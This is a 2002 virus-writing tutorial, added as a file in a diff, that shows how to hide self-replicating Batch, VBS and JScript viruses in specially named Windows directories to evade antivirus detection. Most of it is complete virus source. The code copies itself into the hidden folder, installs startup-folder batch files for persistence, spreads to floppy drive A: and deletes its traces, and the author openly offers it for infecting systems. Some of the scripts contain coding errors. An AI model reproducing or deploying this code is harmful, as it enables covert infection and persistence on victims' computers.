@@ -1,0 +1,295 @@
+			Undeleteable direction via Batch, VBS and JS
+
+In that article I'll show you one of the best way, to be don't detect by AVs.
+The result of this technique is, that the system can be totally infect, but AVs don't detect anything.
+
+1.) Theory
+2.) Source
+    I.) BATCH
+    II.) Visual Basic Script
+    III.) Java Script
+3.) Practice
+    I.) Batch viruz
+    II.) VBS viruz
+    III.) JS viruz
+____________________________________________________________________________________________________________________
+	_________________________________________________________________________________________________
+		_______________________________________________________________________________
+			____________________________________________________________
+				__________________________________________
+					__________________________
+						___________
+						    ____
+
+
+
+
+1.) Theory
+
+OK, I found this technique in the Trojan.BAT.NoDelDir. This Trojan used this technique only
+for makeing undeletable direction. But I try to show you a much better way to use it.
+
+The secret of such an undeleteable direction is the special name of this DIRs.
+For instance "ÅÅ³³" or "Å³Å³". If you make a new DIR in MS-DOS, Windows isn't able to show the user the files in it.
+But it's a normal DIR in DOS. That's the point...
+
+If you copy a viruz to such a DIR, no AV program find it, because the AVs are based of Windows.
+
+
+
+
+
+
+
+
+2.) Source
+
+OK, let's look at viruses using this technique:
+
+
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+I.) BATCH
+
+Batch is the easiest language for this technique, because is use DOS.
+
+Source:
+~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
+
+@echo off
+cd %windir%
+md Å³Å³
+cd Å³Å³
+copy %0 viruz.bat
+
+~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
+
+OK, the viruz make a new DIR in %windir% with this sprecial name.
+Than it copy itself to this DIR.
+No windows-user is able to del this file. Also no AV program find this viruz in the sprecial DIR.
+Hope U understand it.
+
+
+
+
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+II.) Visual Basic Script
+
+It's more difficult to use this techniqe, because it's windows file.
+
+Source:
+~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
+
+On Error Resume Next
+dim fso, wsh, dosfile
+set fso = createobject("scripting.filesystemobject")
+set wsh = wscript.createobject ("wscript.shell")
+fso.CopyFile Wscript.ScriptFullName, "C:\viruz.vbs", True 
+set dosfile = fso.createtextfile ("c:\dosfile.bat", true)
+dosfile.writeline ("@echo off")
+dosfile.writeline ("cd %windir%")
+dosfile.writeline ("md Å³Å³")
+dosfile.writeline ("cd Å³Å³")
+dosfile.writeline ("copy C:\viruz.vbs viruz.vbs")
+dosfile.close
+wsh.run "C:\dosfile.bat"
+
+~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
+OK, the viruz make a copy of itself and a new .BAT file.
+This bat-file copy the viruz-copy to the undeleteable DIR.
+
+
+
+
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+III.) Java Script
+
+It's the same as VBS.
+
+Source:
+~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
+
+var fso=WScript.CreateObject("Scripting.FileSystemObject")
+var MySf=fso.OpenTextFile(WScript.ScriptFullName,1)
+var MySC=MySf.ReadAll()
+var WSHShell = WScript.CreateObject("WScript.Shell");
+MySf.Close()
+MyS=fso.CreateTextFile("C:\viruz.js");
+MyS.WriteLine(MySC);
+MyS.Close();
+
+var wsh = WScript.CreateObject("WScript.Shell");
+dosfile=fso.CreateTextFile("C:\dosfile.bat");
+dosfile.WriteLine("@echo off");
+dosfile.WriteLine("cd %windir%");
+dosfile.WriteLine("md Å³Å³");
+dosfile.WriteLine("cd Å³Å³");
+dosfile.WriteLine("copy C:\viruz.js viruz.js");
+dosfile.Close();
+wsh.Run("C:\dosfile.bat");
+
+~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
+
+First the viruz make a copy of itself to C:\viruz.js.
+Than the Batch file copy the viruz to the undeteable DIR.
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
+
+
+
+
+
+
+
+3.) Practice
+
+Now you know, how to make such an viruz. But perhabs you don't know, how to use it.
+I try to show it now.
+
+I.) Batch viruz
+
+Source:
+~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
+
+@echo off
+cd %windir%
+md Å³Å³
+cd Å³Å³
+copy %0 viruz.bat
+echo @echo off > C:\udf.bat
+echo cd %windir% >> C:\udf.bat
+echo cd Å³Å³ >> C:\udf.bat
+echo viruz.bat >> C:\udf.bat
+copy C:\udf.bat %windir%\Startm~1\Programs\StartUp\winst.bat
+copy C:\axdkp.bat %windir%\startm~1\progra~1\autost~1\winst.bat
+del C:\udf.bat
+command /f /c copy %0 A:\
+
+~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
+This Batch viruz use the undeleteable DIR technique very successful.
+It make the special DIR and copy into.
+Then it makes a other batch-file, that opens the viruz.
+It copy this file to the german and english autostart-dir.
+Then it copy itself to a disk.
+The result is, that the only infect file on the system is in the special DIR.
+So, no AV find it. I think, it's very nice...
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
+
+
+
+II.) VBS viruz
+
+The same via VBS:
+
+Source:
+~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
+
+On Error Resume Next
+dim fso, wsh, dosfile, openvir, copyov
+set fso = createobject("scripting.filesystemobject")
+set wsh = wscript.createobject ("wscript.shell")
+fso.CopyFile Wscript.ScriptFullName, "C:\viruz.vbs", True 
+set dosfile = fso.createtextfile ("c:\dosfile.bat", true)
+dosfile.writeline ("@echo off")
+dosfile.writeline ("cd %windir%")
+dosfile.writeline ("md Å³Å³")
+dosfile.writeline ("cd Å³Å³")
+dosfile.writeline ("copy C:\viruz.vbs viruz.vbs")
+dosfile.writeline ("command /f /c copy C:\viruz.vbs A:\")
+dosfile.writeline ("del C:\viruz.vbs")
+dosfile.writeline ("del %0")
+dosfile.close
+wsh.run "C:\dosfile.bat"
+set openvir = fso.createtextfile ("C:\openvir.bat", true)
+openvir.writeline ("@echo off")
+openvir.writeline ("cd %windir%")
+openvir.writeline ("cd Å³Å³")
+openvir.writeline ("cscript viruz.vbs")
+openvir.close
+set copyov = fso.createtextfile ("C:\copyov.bat", true)
+copyov.writeline ("@echo off")
+copyov.writeline ("copy C:\openvir.bat %windir%\Startm~1\Programs\StartUp\winst.bat")
+copyov.Writeline ("copy C:\openvir.bat %windir%\startm~1\progra~1\autost~1\winst.bat")
+copyov.Writeline ("del C:\openvir.bat")
+copyov.Writeline ("del %0")
+copyov.close
+wsh.run "C:\copyov.bat"
+
+~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
+It's the totally same code as the batch code.
+I think, it's also easy...
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
+
+
+
+III.) JS viruz
+
+Source:
+~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
+
+var fso=WScript.CreateObject("Scripting.FileSystemObject")
+var MySf=fso.OpenTextFile(WScript.ScriptFullName,1)
+var MySC=MySf.ReadAll()
+var WSHShell = WScript.CreateObject("WScript.Shell");
+MySf.Close()
+MyS=fso.CreateTextFile("C:\viruz.js");
+MyS.WriteLine(MySC);
+MyS.Close();
+
+var wsh = WScript.CreateObject("WScript.Shell");
+dosfile=fso.CreateTextFile("C:\dosfile.bat");
+dosfile.WriteLine("@echo off");
+dosfile.WriteLine("cd %windir%");
+dosfile.WriteLine("md Å³Å³");
+dosfile.WriteLine("cd Å³Å³");
+dosfile.WriteLine("copy C:\viruz.js viruz.js");
+dosfile.WriteLine("command /f /c copy C:\viruz.js A:\");
+dosfile.WriteLine("del C:\viruz.js");
+dosfile.WriteLine("del %0");
+dosfile.Close();
+wsh.Run("C:\dosfile.bat");
+
+var openvir= WScript.CreateObject("WScript.Shell");
+openvir.writeline ("@echo off");
+openvir.writeline ("cd %windir%");
+openvir.writeline ("cd Å³Å³");
+openvir.writeline ("cscript viruz.js");
+openvir.Close();
+
+var copyov= WScript.CreateObject("WScript.Shell");
+copyov.writeline ("@echo off");
+copyov.writeline ("copy C:\openvir.bat %windir%\Startm~1\Programs\StartUp\winst.bat");
+copyov.Writeline ("copy C:\openvir.bat %windir%\startm~1\progra~1\autost~1\winst.bat");
+copyov.Writeline ("del C:\openvir.bat");
+copyov.Writeline ("del %0");
+copyov.Close();
+wsh.run ("C:\copyov.bat");
+
+~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
+This viruz does also the same as the batch and the VBS viruz...
+
+
+
+
+
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
+This technique could be very very successful, because no AV program is able to find the virus in the DIR and
+no AV will be able to do it anytime.
+Now I wanna thank the author of Trojan.BAT.NoDelDir to give me the idea for this article.
+
+---------------------
+SeCoNd PaRt To HeLl
+www.spth.de.vu
+spth@jet2web.cc
+written on 06.10.2002
+---------------------
